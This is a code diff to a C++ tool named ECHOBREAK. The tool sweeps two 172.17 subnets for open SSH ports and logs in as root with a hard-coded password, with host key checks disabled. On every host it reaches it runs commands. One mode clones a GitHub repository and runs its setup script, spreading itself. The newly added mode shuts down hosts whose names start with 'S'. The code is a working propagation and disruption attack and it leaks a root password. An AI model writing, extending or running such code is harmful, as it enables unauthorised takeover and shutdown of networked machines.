@@ -90,7 +90,7 @@ inline std::string connect(std::string host, std::string command){
 
 int main(int argc, char* argv[]){
 	std::cout << "W3LC0M T0 \033[095mECHOBREAK\033[0m!!" << std::endl;
-	std::string ip;
+	std::string command;
 	std::vector<std::string> hosts;
 	clock_t start, end;
 	start = clock();
@@ -108,16 +108,16 @@ int main(int argc, char* argv[]){
 		for(int i = 2; i < 256; ++i){
 			//checking for 212
 			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
-				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //ip
-				currect_host = exec(ip.c_str()) + " 172.17.212."+std::to_string(i);
+				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //ip
+				currect_host = exec(command.c_str()) + " 172.17.212."+std::to_string(i);
 				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
 				std::cout << currect_host << std::endl;
 				++total;
 			}
 			//checking for 213
 			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
-				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //ip
-				currect_host = exec(ip.c_str()) + + " 172.17.213."+std::to_string(i);
+				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //ip
+				currect_host = exec(command.c_str()) + + " 172.17.213."+std::to_string(i);
 				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
 				std::cout << currect_host << std::endl;
 				++total;
@@ -136,13 +136,33 @@ int main(int argc, char* argv[]){
 		for(int i = 2; i < 256; ++i){
 			//212
 			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
-				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup"; //command
-				system(ip.c_str());
+				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup"; //command
+				system(command.c_str());
 			}
 			//213
 			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
-				ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup"; //command
-				system(ip.c_str());
+				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " git clone https://github.com/Andrew-24coop/EchoBreak && cd EchoBreak && ./ebsetup"; //command
+				system(command.c_str());
+			}
+		}
+	}
+
+	else if(arg == "shutdown"){
+		std::string time = argv[2];
+		for(int i = 2; i < 256; ++i){
+			//212
+			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
+				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //command
+				if(exec(command.c_str())[0] == 'S'){
+					system(("sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " shutdown " + time).c_str());
+				}
+			}
+			//213
+			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
+				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //command
+				if(exec(command.c_str())[0] == 'S'){
+					system(("sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " shutdown " + time).c_str());
+				}
 			}
 		}
 	}
